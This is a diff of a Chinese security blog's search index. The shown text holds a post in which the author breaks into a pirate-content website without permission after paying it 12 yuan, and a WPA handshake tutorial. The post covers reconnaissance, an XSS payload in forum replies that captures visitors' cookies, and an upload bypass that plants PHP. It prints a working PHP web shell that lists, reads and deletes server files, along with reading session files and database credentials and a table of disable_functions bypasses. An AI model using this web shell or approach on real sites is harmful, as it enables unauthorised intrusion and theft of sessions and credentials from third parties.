+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;dir&quot;</span>];</span><br><span class="line"><span class="variable">$del</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;del&quot;</span>];</span><br><span class="line"><span class="variable">$read</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;read&quot;</span>];</span><br><span class="line"><span class="variable">$fname</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$del</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span>(unlink(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$read</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=fopen(<span class="variable">$dir</span>.<span class="variable">$fname</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> fread(<span class="variable">$handler</span>, filesize(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">	fclose(<span class="variable">$handler</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dir</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=opendir(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">while</span>((<span class="variable">$filename</span> = readdir(<span class="variable">$handler</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	closedir(<span class="variable">$handler</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$fn</span>)&#123;</span><br><span class="line">		<span class="variable">$mark</span>=<span class="string">&quot; &quot;</span>;<span class="keyword">if</span>(is_dir(<span class="variable">$dir</span>.<span class="variable">$fn</span>)) <span class="variable">$mark</span>=<span class="string">&quot;+&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$mark</span> . <span class="variable">$fn</span> . <span class="string">&quot; &quot;</span> . @filesize(<span class="variable">$dir</span>.<span class="variable">$fn</span>) .<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其实功能很简单，就是列出目录、读取文件、删除文件。</p>
+<h3 id="查看Session文件"><a href="#查看Session文件" class="headerlink" title="查看Session文件"></a>查看Session文件</h3><p>忽然想到，之前XSS累死累活，不就是想搞一个SessionID嘛，这都进来了不就可以直接看了？一般情况下，Session文件是存放在<code>/tmp</code>目录下的，PHP默认是以<code>sess_</code>开头的文件名。</p>
+<p>先用之前上传的脚本试一下：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224057289.png" alt="image-20200806224057289"></p>
+<p>Bingo！确实在这里。Response中文件名后面的数字是文件大小，超时的Session文件中的数据会被删除，因此大小是 0 。</p>
+<p>那找一个大小不为0的，看看内容：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224332843.png" alt="image-20200806224332843"></p>
+<h3 id="查看数据库配置"><a href="#查看数据库配置" class="headerlink" title="查看数据库配置"></a>查看数据库配置</h3><p>同理，通过前面phpinfo中的绝对路径，可以构建../来进入<code>application</code>文件夹，读取<code>database.php</code>文件，获取MySQL用户名密码。</p>
+<p>考虑到宝塔启动MySQL用的是低权限账户，且数据库中的数据目前并没有什么用，还可能又风险，想了想还是不去弄了，反正是个思路。</p>
+<h3 id="突破disable-functions"><a href="#突破disable-functions" class="headerlink" title="突破disable_functions"></a>突破disable_functions</h3><p>没有命令执行的WebShell是没有太大的利用价值的，这里想突破一下disable_functions。</p>
+<p>突破的方法有很多，大致总结如下：</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>PHP版本</th>
+<th>条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>寻找未禁用函数</td>
+<td>任意</td>
+<td>disable_functions中没有禁用某些函数</td>
+</tr>
+<tr>
+<td>LD_PRELOAD劫持</td>
+<td>任意</td>
+<td>Linux环境，putenv()、mail()函数可用</td>
+</tr>
+<tr>
+<td>ShellShock绕过</td>
+<td>5.*</td>
+<td>目标OS有CVE-2014-6271，Linux环境，putenv()、mail()函数可用</td>
+</tr>
+<tr>
+<td>imap_open任意命令执行</td>
+<td>任意</td>
+<td>开启imap扩展，并支持imap_open()函数</td>
+</tr>
+<tr>
+<td>Apache+mod_cgi+.htaccess绕过</td>
+<td>任意</td>
+<td>Apache，启用mod-cgi，允许.htaccess且文件可写</td>
+</tr>
+<tr>
+<td>ImageMagick漏洞绕过</td>
+<td>&gt;=5.4</td>
+<td>开启ImageMagick插件且插件版本&lt;= 3.3.0</td>
+</tr>
+<tr>
+<td>FFI外部函数接口绕过</td>
+<td>7.4</td>
+<td>ffi.enable=true</td>
+</tr>
+</tbody></table>
+<p>从目标环境来看，disable_functions已经禁用全部可能利用的函数，导致不满足全部的利用条件。</p>
 ]]></content>
       <tags>
-        <tag>Android</tag>
-        <tag>SQL注入</tag>
+        <tag>Burpsuite</tag>
+        <tag>SQLMap</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -1231,155 +1380,6 @@ Frame 398: <code>Authentication Complete</code><br>
       </tags>
   </entry>
   <entry>
-    <title>被伪装成“知识付费”的盗版网站坑了钱之后……</title>
-    <url>/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/</url>
-    <content><![CDATA[<p>最近迷上了评书，听了一个片段之后很想找到全集把故事听完，于是在网上搜索。找到了一个貌似资源很全的网站，但是“知识付费”时代，必须充会员才能获取真实的下载地址。由于找了很久都没找到这段评书的资源，于是也没多想，充了12元买了这个资源。</p>
-<span id="more"></span>
-
-<p>但是充完之后发现想要的资源下载链接是一个百度云，资源已经失效了，于是想找找反馈的入口。结果仔细一看才发现，这个网站非常不正规，虽然是通过QQ登录，但是一般网站会有独立的账号体系，而这个网站不能修改用户的信息，看起来就像是没完工的测试项目似的。</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806160535564.png" alt="image-20200806160535564"></p>
-<p>而且网站中的资源非常博杂，从相声戏曲，到新媒体运营，再到编程、软件，简直应有尽有，而且全是百度云的资源，看起来像是收集的盗版的东西。大部分的资源页面包括首页推荐的热门资源中都没有任何留言，就像一幢豪华CBD大厦里面空无一人，显得异常诡异。</p>
-<p>查看页面的过程中，只看到了一个站长的联系QQ，加过之后也没反应。那既然这样，还是靠自己一探究竟吧。</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>俗话说知己知彼，百战不殆。在正式开始之前先收集一下目标站点的信息。不同于正规的渗透测试，目标就是这个网站，因此就从服务器IP、开放端口、域名、接口这些信息下手。</p>
-<h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>首先通过域名，反查它的IP地址以及子域名信息。这里子域名查询没有啥结果，也和预想的差不多，一个坑钱的小网站应该也不会有什么其他子域。</p>
-<p>这里用了Chrome的插件 hacker target 来进行简单查询：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163057871.png" alt="image-20200806163057871"></p>
-<h3 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h3><p>拿到了IP地址，利用shodan初步看看开放了什么端口：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806162913629.png" alt="image-20200806162913629"></p>
-<p>好家伙，有22还有3306？不过shodan向来都不太准，再用其他的工具确认一下。</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163328543.png" alt="image-20200806163328543"></p>
-<p>这回发现多了个21，却没有3306了。那最后再用本机的nmap确认一下端口。</p>
-<p>因为直接跑nmap 65535个端口时间太长，而且很容易被云厂商认为是扫描行为而封禁IP，所以可以用这种外围打探的方式先确定基本的端口，最后再用nmap指定端口来确定是否真的开放了。</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806164804389.png" alt="image-20200806164804389"></p>
-<p>那么目前能确定的开放端口就是这些。</p>
-<h3 id="组件信息"><a href="#组件信息" class="headerlink" title="组件信息"></a>组件信息</h3><p>对于开放的端口，简单识别一下，其中<code>21 - FTP</code>, <code>22 - SSH</code>, <code>80,443 - HTTP(S)</code>, <code>3306 - MySQL</code>，那剩下的8888是什么？访问一下界面，从内容看应该是宝塔面板的登录接口，但是做了相应的安全设置。</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806200632061.png" alt="image-20200806200632061"></p>
-<p>回到HTTP(S)服务上来，先尝试用在线CMS识别，发现无法识别出使用的CMS，只知道用的是PHP：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201506225.png" alt="image-20200806201506225"></p>
-<p>再看robots.txt文件，也没什么发现：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201628384.png" alt="image-20200806201628384"></p>
-<p>那么目前判断很有可能就是自己开发的系统。而2020年用PHP开发系统，至少是基于某个框架的，因此寻找一下有没有使用框架的蛛丝马迹。很快，在未登录状态下点击发帖按钮有个登录跳转（这部分在下文详细说如何发现的）：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201941920.png" alt="image-20200806201941920"></p>
-<p>咦？这熟悉的 :( 很想是thinkphp呀！</p>
-<p>至此，简单的目标信息收集就结束了，总结如下：</p>
-<p>目标域名：<a href="http://www.xxx.net/">www.xxx.net</a></p>
-<p>子域名：无</p>
-<p>目标IP：3x.xx.xx.x1</p>
-<p>开放端口：21，22，80，443，3306，8888</p>
-<p>CMS信息：暂无</p>
-<p>使用语言：PHP</p>
-<p>使用框架：ThinkPHP（目前版本未知）</p>
-<p>部署环境：宝塔Linux面板</p>
-<h2 id="威胁建模-漏洞分析"><a href="#威胁建模-漏洞分析" class="headerlink" title="威胁建模/漏洞分析"></a>威胁建模/漏洞分析</h2><p>由于是纯黑盒测试，因此不可能有完整的威胁建模进行漏洞分析，只能根据前期收集的信息结合挖洞的过程来慢慢进行威胁建模的部分，因此这两块是合在一起进行的。</p>
-<p>首先根据信息收集的内容，可以知道21和22两个端口大概率是宝塔面板提供的，为了方便用户对网站进行管理。因此这里就不去尝试暴力破解了（印象中宝塔是不允许设置弱密码的），如果Web应用的部分无法突破再考虑端口的暴力破解。同理3306也是这样。</p>
-<p>8888端口是宝塔的控制面板，因为安全策略无法直接使用。因此将注意力放在443端口的Web Appication上。</p>
-<h3 id="HTML-JS分析"><a href="#HTML-JS分析" class="headerlink" title="HTML/JS分析"></a>HTML/JS分析</h3><p>很多情况下，在HTML源码和JS脚本中可能会隐藏诸多秘密，尤其是在目前前端开发喜欢用VUE.js，网站的页面路径很多都会在JS里暴露。</p>
-<p>首先先看首页的HTML源码以及加载的非第三方JS代码。在首页的HTML源码中，发现了一段被注释掉的导航栏代码：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205311823.png" alt="image-20200806205311823"></p>
-<p>试一下<code>/taolun</code>，看看还有没有这个页面：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205618250.png" alt="image-20200806205618250"></p>
-<p>看到这个讨论区，很多都是在吐槽链接失效、资源付费后没用的帖子，难怪要把这个导航栏给注释掉！</p>
-<p>在页面右下角有一个发新帖的按钮，由于是未登录状态，因此点击之后弹出跳转登录的错误页面（即信息收集里看到的 :( 的页面），确定目标使用的框架是Thinkphp。</p>
-<p>看了其他页面的HTML和JS，没有其他有价值的内容了。</p>
-<h3 id="ThinkPHP已知漏洞"><a href="#ThinkPHP已知漏洞" class="headerlink" title="ThinkPHP已知漏洞"></a>ThinkPHP已知漏洞</h3><p>既然确定了框架是TP，那么可以试试已知漏洞，万一有呢~</p>
-<p>可以利用<a href="https://github.com/theLSA/tp5-getshell/%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%96%B9%E4%BE%BF%E7%9A%84%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%E3%80%82">https://github.com/theLSA/tp5-getshell/工具来方便的进行检测。</a></p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806211806612.png" alt="image-20200806211806612"></p>
-<p>这里显示三个PoC均为404，可能是路由配置与默认有差距。这里可以执行其他的用例，比如_method变量覆盖漏洞（可参考<a href="https://www.cnblogs.com/WindrunnerMax/p/12558256.html">《ThinkPHP5.0 漏洞测试》</a>）：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806212306138.png" alt="image-20200806212306138"></p>
-<p>这里成功让系统报错，再次确认确实是TP的框架，版本V5.0.0，以及绝对路径等等，这里就不再详细展示。</p>
-<p>测试了其他的已知漏洞，都未能成功触发，此路不通。</p>
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>因为用的是TP的框架，因此这里实际上也算是已知漏洞的验证了。因为TP自带防护，而且测试了几个点发现SQL防护应该是打开的，而某些注入是需要特定条件（比如把input变量直接转成数组），因为没有源码，试了几个点都没成功就放弃了&gt;.&lt; …</p>
-<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS在这里其实没太大作用，整个网站都没找到有与后台的联系，比如问题反馈什么的，不确定管理员是否会去查看，不过抱着试一试的心情，开始找输入点。</p>
-<p>依然还是在<code>/taolun</code>的页面下，找了个帖子进去，发现可以回帖。本着先试试水的心态，复制了这个帖子的标题进去，发现竟然编辑器支持样式！</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806213651303.png" alt="image-20200806213651303"></p>
-<p>那这就说明，很有可能这个接口根本不会对输入进行过滤！</p>
-<p>迅速打开XSS平台，将代码复制下来，用Burpsuite拦住消息，在结尾插入代码，搞定！</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214055993.png" alt="image-20200806214055993"></p>
-<p>先试试我自己：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214330841.png" alt="image-20200806214330841"></p>
-<p>成功读到了我的Cookie。</p>
-<p>但是因为并没有注意邮件，实际上很快就有人看了这个帖子触发了XSS，但等我看到的时候已经失效了……</p>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>因为XSS的成功，我判断目标站点应该是除了框架默认的安全配置之外并没有进行额外的安全加固。在“发新帖”的部分，允许用户在帖子里上传图片：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806215141784.png" alt="image-20200806215141784"></p>
-<p>这就给了我机会了。先试试简单的，编辑一个文本文件，内容是</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure>
-
-<p>文件名保存成<code>1.jpg</code>。上传的时候用Burp将filename的后缀改成.php：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222704821.png" alt="image-20200806222704821"></p>
-<p>浏览器访问成功：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222905548.png" alt="image-20200806222905548"></p>
-<p>利用这个页面，正好查看一下disable_functions的情况：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222955099.png" alt="image-20200806222955099"></p>
-<p>这里可以看到，应该是宝塔面板的设置，在配置里将所有可能命令执行的函数全部都禁用了，因此上传Webshell也没什么意义，没法用菜刀或者AntSword进行连接。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上面的步骤试探到文件上传，就已经找到了相应的方法可以进行利用了。本来的想法是通过文件上传进行反弹Shell，进一步提权进行后渗透的步骤，但是这里因为<code>disable_functions</code>卡住，需要绕过。</p>
-<p>在实施绕过这个步骤之前，可以考虑先利用一下3306端口。之前发现3306是开放的，目前又可以上传PHP源码，可以写一个读取文件的PHP代码，将TP的database.php读出来，获取到数据库用户名和密码从而进行连接。</p>
-<p>同时，为了保证之前的phpinfo页面不被其他人发现，写了一个删除文件功能（如果后面不用了还能把上传的这些PHP都删了）：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;dir&quot;</span>];</span><br><span class="line"><span class="variable">$del</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;del&quot;</span>];</span><br><span class="line"><span class="variable">$read</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;read&quot;</span>];</span><br><span class="line"><span class="variable">$fname</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$del</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span>(unlink(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$read</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=fopen(<span class="variable">$dir</span>.<span class="variable">$fname</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> fread(<span class="variable">$handler</span>, filesize(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">	fclose(<span class="variable">$handler</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dir</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=opendir(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">while</span>((<span class="variable">$filename</span> = readdir(<span class="variable">$handler</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	closedir(<span class="variable">$handler</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$fn</span>)&#123;</span><br><span class="line">		<span class="variable">$mark</span>=<span class="string">&quot; &quot;</span>;<span class="keyword">if</span>(is_dir(<span class="variable">$dir</span>.<span class="variable">$fn</span>)) <span class="variable">$mark</span>=<span class="string">&quot;+&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$mark</span> . <span class="variable">$fn</span> . <span class="string">&quot; &quot;</span> . @filesize(<span class="variable">$dir</span>.<span class="variable">$fn</span>) .<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>其实功能很简单，就是列出目录、读取文件、删除文件。</p>
-<h3 id="查看Session文件"><a href="#查看Session文件" class="headerlink" title="查看Session文件"></a>查看Session文件</h3><p>忽然想到，之前XSS累死累活，不就是想搞一个SessionID嘛，这都进来了不就可以直接看了？一般情况下，Session文件是存放在<code>/tmp</code>目录下的，PHP默认是以<code>sess_</code>开头的文件名。</p>
-<p>先用之前上传的脚本试一下：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224057289.png" alt="image-20200806224057289"></p>
-<p>Bingo！确实在这里。Response中文件名后面的数字是文件大小，超时的Session文件中的数据会被删除，因此大小是 0 。</p>
-<p>那找一个大小不为0的，看看内容：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224332843.png" alt="image-20200806224332843"></p>
-<h3 id="查看数据库配置"><a href="#查看数据库配置" class="headerlink" title="查看数据库配置"></a>查看数据库配置</h3><p>同理，通过前面phpinfo中的绝对路径，可以构建../来进入<code>application</code>文件夹，读取<code>database.php</code>文件，获取MySQL用户名密码。</p>
-<p>考虑到宝塔启动MySQL用的是低权限账户，且数据库中的数据目前并没有什么用，还可能又风险，想了想还是不去弄了，反正是个思路。</p>
-<h3 id="突破disable-functions"><a href="#突破disable-functions" class="headerlink" title="突破disable_functions"></a>突破disable_functions</h3><p>没有命令执行的WebShell是没有太大的利用价值的，这里想突破一下disable_functions。</p>
-<p>突破的方法有很多，大致总结如下：</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>PHP版本</th>
-<th>条件</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>寻找未禁用函数</td>
-<td>任意</td>
-<td>disable_functions中没有禁用某些函数</td>
-</tr>
-<tr>
-<td>LD_PRELOAD劫持</td>
-<td>任意</td>
-<td>Linux环境，putenv()、mail()函数可用</td>
-</tr>
-<tr>
-<td>ShellShock绕过</td>
-<td>5.*</td>
-<td>目标OS有CVE-2014-6271，Linux环境，putenv()、mail()函数可用</td>
-</tr>
-<tr>
-<td>imap_open任意命令执行</td>
-<td>任意</td>
-<td>开启imap扩展，并支持imap_open()函数</td>
-</tr>
-<tr>
-<td>Apache+mod_cgi+.htaccess绕过</td>
-<td>任意</td>
-<td>Apache，启用mod-cgi，允许.htaccess且文件可写</td>
-</tr>
-<tr>
-<td>ImageMagick漏洞绕过</td>
-<td>&gt;=5.4</td>
-<td>开启ImageMagick插件且插件版本&lt;= 3.3.0</td>
-</tr>
-<tr>
-<td>FFI外部函数接口绕过</td>
-<td>7.4</td>
-<td>ffi.enable=true</td>
-</tr>
-</tbody></table>
-<p>从目标环境来看，disable_functions已经禁用全部可能利用的函数，导致不满足全部的利用条件。</p>
-]]></content>
-      <tags>
-        <tag>Burpsuite</tag>
-        <tag>SQLMap</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Root-me Web-Server WriteUp</title>
     <url>/2019/06/26/Root-me-Web-Server-WriteUp/</url>
     <content><![CDATA[<p>最近在做<a href="https://www.root-me.org/">Root-me</a>的题，顺手记一下相关的题目的解题思路，顺便梳理一下各个知识点。</p>
@@ -1561,143 +1561,6 @@ http://challenge01.root-me.org/web-serveur/ch52/?url=https://baidu.com&h=bb6e082
       </tags>
   </entry>
   <entry>
-    <title>WPA四次握手过程解析</title>
-    <url>/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/</url>
-    <content><![CDATA[<p>最近在梳理Wi-Fi的攻击方式，又看到了17年的KRACK漏洞。当时只是看了漏洞的原理和危害，并没有理解漏洞的成因和为什么被利用。本文尝试结合Python代码来理解一下WPA四次握手的过程，以及尝试分析一下KRACK漏洞。</p>
-<span id="more"></span>
-
-<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>在正式开始分析之前，先要准备一下软件和分析对象。</p>
-<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><p>本次使用的操作系统是Windows10 1909，部分需要Linux的使用虚拟机安装的Kali进行。</p>
-<p>代码部分，解释器版本为Python 2.7。</p>
-<p>数据包分析工具使用经典的Wireshark。</p>
-<h2 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h2><p>由于不同的加密方法和参数对握手包的影响较大，因此分析对象使用了Wireshark官方给出的WPA数据包。</p>
-<p>该数据包可以在<a href="https://wiki.wireshark.org/HowToDecrypt802.11%E9%A1%B5%E9%9D%A2%E4%B8%8A%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD%EF%BC%9A">https://wiki.wireshark.org/HowToDecrypt802.11页面上进行下载：</a></p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629105537200.png" alt="image-20200629105537200"></p>
-<p>额外说明一下，如果想自己捕获设备的WPA握手包，则需要额外的软件，并将网卡置为<code>Monitor Mode</code>。下面简单介绍一下。</p>
-<h2 id="手动捕获握手包"><a href="#手动捕获握手包" class="headerlink" title="手动捕获握手包"></a>手动捕获握手包</h2><p><strong>Windows平台</strong>：在Windows平台下想要捕获802.11管理帧，需要使用微软官方的软件<a href="https://www.microsoft.com/en-us/download/details.aspx?id=4865">Microsoft Network Monitor</a>。它的安装和使用也相对比较方便，网上也有相当多的教程，如《<a href="https://cstriker1407.info/blog/windows-80211-frame/">windows下抓取802.11管理包</a>》。有一点需要注意，该软件在“扫描设置（Scanning Options）”中开启<code>Monitor Mode</code>后，该窗口不能关闭，否则会退出：</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/20150905181951_10373.png" alt="img"></p>
-<p><strong>Linux平台</strong>：在Linux平台下，可以借助我们熟悉的<code>aircrack-ng</code>套件来设置网卡的<code>Monitor Mode</code>，并使用<code>Wireshrak</code>来获取和查看数据。此处以Kali为例，其他Linux系统可以自行安装相关套件。</p>
-<p>设置监听模式的命令为：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airmon-ng start wlan0</span></span><br></pre></td></tr></table></figure>
-
-<p>其中<code>wlan0</code>是网卡的名称。若出现以下情况：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airmon-ng start wlan0</span></span><br><span class="line"></span><br><span class="line">Found <span class="number">2</span> processes that could cause trouble.</span><br><span class="line"><span class="keyword">If</span> airodump<span class="literal">-ng</span>, aireplay<span class="literal">-ng</span> or airtun<span class="literal">-ng</span> stops working after</span><br><span class="line">a short period of time, you may want to run <span class="string">&#x27;airmon-ng check kill&#x27;</span></span><br><span class="line"></span><br><span class="line">    PID Name</span><br><span class="line">   <span class="number">1959</span> NetworkManager</span><br><span class="line">   <span class="number">1989</span> wpa_supplicant</span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlan0		rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br><span class="line"></span><br><span class="line">		(mac80211 monitor mode vif enabled <span class="keyword">for</span> [<span class="type">phy0</span>]wlan0 on [<span class="type">phy0</span>]wlan0mon)</span><br><span class="line">		(mac80211 station mode vif disabled <span class="keyword">for</span> [<span class="type">phy0</span>]wlan0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
